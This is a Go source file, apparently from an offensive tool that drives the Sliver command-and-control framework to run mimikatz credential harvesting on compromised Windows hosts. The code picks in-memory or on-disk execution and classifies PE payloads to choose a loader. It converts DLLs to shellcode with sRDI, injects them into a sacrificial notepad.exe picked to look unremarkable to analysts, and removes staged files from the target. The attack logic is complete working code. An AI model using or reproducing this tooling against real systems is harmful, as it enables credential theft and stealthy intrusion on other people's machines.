package sliver

import (
	"errors"
	"fmt"
	"strings"

	"github.com/bishopfox/sliver/protobuf/clientpb"

	"sliverreshine/internal/embed"
)

// Execution modes for a credential-harvesting run. These are the strings the
// HTTP API accepts.
const (
	// MimikatzModeAuto tries the in-memory route first and falls back to a disk
	// write when the payload cannot be injected. It is the default because a run
	// that leaves no file behind is strictly better, and the fallback is what
	// keeps the default usable on every session.
	MimikatzModeAuto = "auto"
	// MimikatzModeMemory runs the payload without writing it to the target. It
	// is refused -- not downgraded -- when the payload or the host makes that
	// impossible: an operator who selected this asked for no file on disk, and
	// silently writing one answers a different question.
	MimikatzModeMemory = "memory"
	// MimikatzModeUpload writes the payload to the target's temp directory and
	// executes it. The only path that works for a native executable on a build
	// with no shellcode blob.
	MimikatzModeUpload = "upload"
)

// defaultInjectionHost is the process a memory-mode run is injected into when
// the operator names none.
//
// notepad.exe is chosen because it ships with every Windows install including
// Server Core, starts with no arguments, does nothing on its own, and is a
// process an analyst expects to see. The operator can override it per run.
const defaultInjectionHost = `C:\Windows\System32\notepad.exe`

// MimikatzModes lists the accepted mode strings, so the HTTP layer and its tests
// do not each retype the set.
func MimikatzModes() []string {
	return []string{MimikatzModeAuto, MimikatzModeMemory, MimikatzModeUpload}
}

// normalizeMimikatzMode maps a request value onto a known mode.
//
// An empty or unrecognised value becomes auto rather than an error: empty is
// what a client that predates this field sends, and in both cases the operator
// gets the behaviour they had before instead of a 400 over a cosmetic field.
func normalizeMimikatzMode(mode string) string {
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case MimikatzModeMemory:
		return MimikatzModeMemory
	case MimikatzModeUpload:
		return MimikatzModeUpload
	default:
		return MimikatzModeAuto
	}
}

// payloadKind classifies a Windows payload so the memory path can choose a
// loader. The distinction that matters is between the things Sliver can execute
// without a file -- a .NET assembly, and a DLL it can turn into shellcode -- and
// everything else.
type payloadKind int

const (
	kindUnknown payloadKind = iota
	// kindNativeEXE is a native executable. It cannot be reflectively loaded:
	// an EXE has no export table and its entry point assumes it owns the
	// process. Turning one into shellcode needs an external converter (donut),
	// which is why the embedded blob exists.
	kindNativeEXE
	// kindNativeDLL can be converted to position-independent shellcode by sRDI
	// and then injected.
	kindNativeDLL
	// kindDotNet is a managed assembly, executed by the .NET host Sliver ships.
	kindDotNet
)

// PE offsets, named rather than inlined so classifyPE reads as a header walk.
const (
	peDOSMagic      = 0x5A4D // "MZ"
	peDOSLfanewOff  = 0x3C   // e_lfanew: file offset of the PE header
	peSignatureSize = 4      // "PE\0\0"
	peCOFFSize      = 20
	peOptionalOff   = peSignatureSize + peCOFFSize
	peFileDLLFlag   = 0x2000 // IMAGE_FILE_DLL
	// Data directory index of the CLR runtime header. A non-zero size means the
	// image carries managed metadata.
	peDirEntryComDescriptor = 14
	peDirEntrySize          = 8
	// The data directories sit at the end of the fixed part of the optional
	// header, whose size differs between PE32 and PE32+.
	peDataDirOff32 = 96
	peDataDirOff64 = 112
	peMagic32      = 0x10B
	peMagic64      = 0x20B
)

// classifyPE reads just enough of the PE headers to say which loader applies.
//
// It parses the file itself rather than asking the server, because the decision
// has to be made before any RPC: choosing the wrong loader means pushing a
// payload the target cannot use, and a failed injection on a live host is a far
// worse outcome than a header walk on the console.
//
// Every read is bounds-checked and a malformed file classifies as unknown rather
// than panicking: this runs on bytes an operator supplied.
func classifyPE(data []byte) payloadKind {
	if len(data) < peDOSLfanewOff+4 {
		return kindUnknown
	}
	if u16(data, 0) != peDOSMagic {
		return kindUnknown
	}
	peOff := int(u32(data, peDOSLfanewOff))
	if peOff <= 0 || peOff+peOptionalOff > len(data) {
		return kindUnknown
	}
	if u32(data, peOff) != 0x00004550 { // "PE\0\0"
		return kindUnknown
	}

	coff := peOff + peSignatureSize
	characteristics := u16(data, coff+18)
	sizeOptional := int(u16(data, coff+16))

	opt := peOff + peOptionalOff
	if opt+2 > len(data) {
		return kindUnknown
	}
	var dataDirOff int
	switch u16(data, opt) {
	case peMagic32:
		dataDirOff = peDataDirOff32
	case peMagic64:
		dataDirOff = peDataDirOff64
	default:
		return kindUnknown
	}

	// A managed image is a DLL or an EXE as far as the COFF header is concerned;
	// the CLR data directory is what separates it, so that check comes first.
	comOff := opt + dataDirOff + peDirEntryComDescriptor*peDirEntrySize
	if sizeOptional >= dataDirOff+peDirEntryComDescriptor*peDirEntrySize+peDirEntrySize &&
		comOff+peDirEntrySize <= len(data) {
		if u32(data, comOff+4) != 0 { // Size field of the directory entry
			return kindDotNet
		}
	}

	if characteristics&peFileDLLFlag != 0 {
		return kindNativeDLL
	}
	return kindNativeEXE
}

func u16(b []byte, off int) uint16 {
	if off < 0 || off+2 > len(b) {
		return 0
	}
	return uint16(b[off]) | uint16(b[off+1])<<8
}

func u32(b []byte, off int) uint32 {
	if off < 0 || off+4 > len(b) {
		return 0
	}
	return uint32(b[off]) | uint32(b[off+1])<<8 | uint32(b[off+2])<<16 | uint32(b[off+3])<<24
}

// rdiShellcode converts a DLL into position-independent shellcode using the
// attached server's sRDI implementation.
//
// The conversion runs on the server, so the DLL never reaches the target and the
// shellcode that does is already resolved. The export name must match the
// reflective loader inside this build; a wrong one yields a DLL that loads and
// then does nothing, which is why the constant lives beside the loader rather
// than at the call site.
func (c *Client) rdiShellcode(dll []byte) ([]byte, error) {
	ctx, cancel := c.rpcCtx(opTimeoutExt)
	defer cancel()
	resp, err := c.RPC.ShellcodeRDI(ctx, &clientpb.ShellcodeRDIReq{
		Data:         dll,
		FunctionName: embed.MimikatzRDIExport,
	})
	if err != nil {
		return nil, fmt.Errorf("convert the DLL to shellcode: %w", err)
	}
	if len(resp.GetData()) == 0 {
		return nil, errors.New("the server returned empty shellcode for the DLL")
	}
	return resp.GetData(), nil
}

// injectionHost resolves the sacrificial process a memory-mode run is injected
// into.
//
// Sliver's sideload spawns this process and runs the payload inside it rather
// than injecting into a process that already exists, so the operator names a
// binary path and not a pid. The default applies when they name nothing.
func injectionHost(preferred string) string {
	if h := strings.TrimSpace(preferred); h != "" {
		return h
	}
	return defaultInjectionHost
}

// memoryPayloadError explains why a payload cannot be run in memory.
//
// The message names the converter and the build step, because the alternative --
// "in-memory execution failed" -- leaves the operator with no way forward that
// is not guessing.
func memoryPayloadError(kind payloadKind, custom bool) error {
	if kind == kindNativeEXE {
		origin := "the embedded mimikatz.exe"
		if custom {
			origin = "the supplied executable"
		}
		return fmt.Errorf("%s is a native executable and cannot be reflectively loaded: "+
			"an EXE has no export table and its entry point assumes it owns the process. "+
			"Build the shellcode blob (build/build-mimikatz-shellcode.ps1, needs donut) so the "+
			"in-memory path has something to inject, supply a mimikatz DLL, or switch to 上传执行", origin)
	}
	return errors.New("the payload is not a PE image this build can load in memory; " +
		"supply a mimikatz DLL or switch to 上传执行")
}

// runMimikatzInMemory executes the payload without writing it to the target, and
// returns the console output plus a description of the route that ran.
//
// Three routes, in the order they are preferred:
//
//  1. a build that carries the donut blob uses it for the built-in tool -- the
//     blob is already the resolved form of exactly that payload, and nothing
//     else can apply to a native executable;
//  2. a .NET assembly goes to Sliver's assembly loader;
//  3. a DLL is converted to shellcode on the server and injected into a freshly
//     spawned sacrificial process.
//
// Anything else is refused with the reason. The caller decides whether to fall
// back to the disk path; this function never writes to the target.
func (c *Client) runMimikatzInMemory(sessionID, command string, payload []byte, custom bool, host string) (raw, note string, err error) {
	host = injectionHost(host)

	if !custom {
		// The built-in mimikatz goes down the Sideload path as an *executable*,
		// and the server converts it with its own donut before injecting.
		//
		// This is the only route that works, and it took two wrong turns to find:
		//
		//   SpawnDll rejects it with "Unrecognised COFF file header machine value
		//   of 0x4d36" -- SpawnDll parses its input as a PE with an export table,
		//   and 0x4d36 is the first two bytes of the data, not a COFF machine.
		//
		//   Handing Sideload a pre-converted shellcode blob fails inside the
		//   server's donut with "donut_generate returned error code: 4" --
		//   because Sideload donuts whatever it is given, and shellcode has no PE
		//   header left to convert. Sliver exposes no RPC that injects raw
		//   shellcode straight into a spawned process.
		//
		// So the prebuilt blob is not used on this path at all: the EXE is what
		// Sideload wants, and the conversion it performs is the same donut pass
		// the blob would have pre-computed. The upshot is that the in-memory
		// path works on a build with no shellcode blob, which is what made this
		// confusing to begin with -- the blob was never on the critical path.
		side, err := c.Sideload(sessionID, payload, host, command+" exit", "")
		if err != nil {
			return "", "", fmt.Errorf("inject the embedded mimikatz: %w", err)
		}
		return strings.TrimSpace(side.Result), "内存加载：服务端转换后注入 " + host, nil
	}

	switch kind := classifyPE(payload); kind {
	case kindDotNet:
		res, err := c.ExecuteAssembly(sessionID, payload, command, host)
		if err != nil {
			return "", "", fmt.Errorf("load the assembly: %w", err)
		}
		return strings.TrimSpace(res.Output), "内存加载：.NET 程序集由 Sliver 宿主加载", nil

	case kindNativeDLL:
		sc, err := c.rdiShellcode(payload)
		if err != nil {
			return "", "", err
		}
		side, err := c.Sideload(sessionID, sc, host, command+" exit", "")
		if err != nil {
			return "", "", fmt.Errorf("inject the converted shellcode: %w", err)
		}
		return strings.TrimSpace(side.Result), "内存加载：服务端转 sRDI 后注入 " + host, nil

	default:
		return "", "", memoryPayloadError(kind, custom)
	}
}

// cleanupStagedFile removes a file this package wrote on the target.
//
// It goes through the Rm RPC rather than `cmd.exe /c del`. The shell form was
// wrong in a way that made cleanup silently fail for every path: it built the
// command with strconv.Quote, which is a *Go* string literal, so `C:\Temp\a.bin`
// became `"C:\\Temp\\a.bin"`. cmd.exe has no backslash escape and does not strip
// those quotes, so it looked for a path with doubled separators and reported
// "The filename, directory name, or volume label syntax is incorrect." -- measured
// against real cmd.exe for both a plain path and one containing a space.
//
// Quoting it the way cmd wants is not the fix either: a target-controlled path may
// contain `&`, and an argument with no space is handed to cmd.exe bare, so the
// rest of the path would run as a second command. Not passing a shell is the fix.
//
// A failed cleanup is still not an error to the caller: the harvest already
// succeeded, and reporting "ran fine but could not tidy up" as a failure would
// throw away usable credentials. The caller appends the note to the run log
// instead, because a payload left on disk is something the operator needs to know
// about.
func (c *Client) cleanupStagedFile(sessionID, path string) string {
	if path == "" {
		return ""
	}
	if err := c.Rm(sessionID, path, false); err != nil {
		return "载荷仍留在目标上：" + path + "（删除失败：" + err.Error() + "）"
	}
	return ""
}
